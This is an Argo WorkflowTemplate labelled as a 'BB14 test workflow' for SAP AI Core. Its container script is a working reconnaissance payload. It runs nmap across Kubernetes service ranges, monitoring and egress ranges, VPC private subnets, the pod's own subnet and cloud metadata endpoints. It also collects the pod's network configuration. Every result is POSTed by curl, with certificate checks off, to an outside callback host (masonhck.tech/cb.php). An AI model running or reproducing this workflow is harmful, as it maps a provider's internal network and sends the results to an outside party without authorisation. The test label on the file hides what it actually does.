apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "8.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }

        get "recon8-start-$(hostname)"

        # Pod network info
        ip addr show 2>&1 | post "recon8-ipaddr"
        ip route show 2>&1 | post "recon8-routes"
        cat /etc/resolv.conf 2>&1 | post "recon8-resolv"

        PORTS="80,443,2049,2379,2380,3000,3100,3306,4317,4318,5432,5601,6379,6443,8080,8200,8443,8888,9090,9200,9300,10250,10255,15010,15014,27017,44134"

        # === SCAN 1: K8s Service CIDR (100.104.0.0/24) ===
        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.104.0.0/24 -oG /tmp/scan1.txt 2>&1 | tail -5 | post "recon8-scan1-summary"
        grep "open" /tmp/scan1.txt | head -c 1800 | post "recon8-scan1-open"

        # === SCAN 2: K8s Service CIDR extended (100.104.1-10.0/24) ===
        for i in 1 2 3 4 5 7 8 9 10; do
          nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.104.${i}.0/24 -oG - 2>/dev/null | grep "open" >> /tmp/scan2.txt
        done
        wc -l /tmp/scan2.txt 2>/dev/null | post "recon8-scan2-count"
        head -c 1800 /tmp/scan2.txt 2>/dev/null | post "recon8-scan2-open"

        # === SCAN 3: OTel/monitoring range (100.110.0.0/24) ===
        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.110.0.0/24 -oG /tmp/scan3.txt 2>&1 | tail -5 | post "recon8-scan3-summary"
        grep "open" /tmp/scan3.txt | head -c 1800 | post "recon8-scan3-open"

        # === SCAN 4: Second OTel range (100.109.0.0/24) ===
        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.109.0.0/24 -oG /tmp/scan4.txt 2>&1 | tail -5 | post "recon8-scan4-summary"
        grep "open" /tmp/scan4.txt | head -c 1800 | post "recon8-scan4-open"

        # === SCAN 5: Third range (100.98.0.0/24) ===
        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.98.0.0/24 -oG /tmp/scan5.txt 2>&1 | tail -5 | post "recon8-scan5-summary"
        grep "open" /tmp/scan5.txt | head -c 1800 | post "recon8-scan5-open"

        # === SCAN 6: Egress gateway range (100.64.56-68.0/24) ===
        for i in 56 57 58 59 60 61 62 63 64 65 66 67 68; do
          nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.64.${i}.0/24 -oG - 2>/dev/null | grep "open" >> /tmp/scan6.txt
        done
        wc -l /tmp/scan6.txt 2>/dev/null | post "recon8-scan6-count"
        head -c 1800 /tmp/scan6.txt 2>/dev/null | post "recon8-scan6-open"

        # === SCAN 7: VPC private ranges ===
        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 10.0.0.0/24 -oG /tmp/scan7a.txt 2>&1 | tail -3 | post "recon8-scan7a-summary"
        grep "open" /tmp/scan7a.txt | head -c 1800 | post "recon8-scan7a-open"
        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 172.20.0.0/24 -oG /tmp/scan7b.txt 2>&1 | tail -3 | post "recon8-scan7b-summary"
        grep "open" /tmp/scan7b.txt | head -c 1800 | post "recon8-scan7b-open"

        # === SCAN 8: Pod's own subnet ===
        MY_IP=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
        MY_NET=$(echo $MY_IP | sed 's/\.[0-9]*$/.0/')
        echo "pod_ip=${MY_IP} subnet=${MY_NET}/24" | post "recon8-pod-subnet"
        nmap -sT -T4 --open --min-rate 500 -p ${PORTS} ${MY_NET}/24 -oG /tmp/scan8.txt 2>&1 | tail -5 | post "recon8-scan8-summary"
        grep "open" /tmp/scan8.txt | head -c 1800 | post "recon8-scan8-open"

        # === SCAN 9: IMDS and link-local ===
        nmap -sT -T4 --open -p 80,443 169.254.169.254 -oG - 2>&1 | tail -3 | post "recon8-imds"
        nmap -sT -T4 --open -p 80,443 169.254.170.2 -oG - 2>&1 | tail -3 | post "recon8-ecs-meta"

        # === SCAN 10: Broader K8s service range 100.104.100-200 ===
        for i in 50 100 150 178 200; do
          nmap -sT -T4 --open --min-rate 500 -p ${PORTS} 100.104.${i}.0/24 -oG - 2>/dev/null | grep "open" >> /tmp/scan10.txt
        done
        wc -l /tmp/scan10.txt 2>/dev/null | post "recon8-scan10-count"
        head -c 1800 /tmp/scan10.txt 2>/dev/null | post "recon8-scan10-open"

        # === AGGREGATE: All open ports across all scans ===
        cat /tmp/scan*.txt 2>/dev/null | grep "open" | sort -u > /tmp/all_open.txt
        wc -l /tmp/all_open.txt | post "recon8-total-open"
        head -c 1800 /tmp/all_open.txt | post "recon8-all-open-1"
        tail -c +1801 /tmp/all_open.txt | head -c 1800 | post "recon8-all-open-2"
        tail -c +3601 /tmp/all_open.txt | head -c 1800 | post "recon8-all-open-3"

        get "recon8-done-$(hostname)"
      resources:
        limits:
          cpu: "2"
          memory: "2Gi"
        requests:
          cpu: "500m"
          memory: "512Mi"
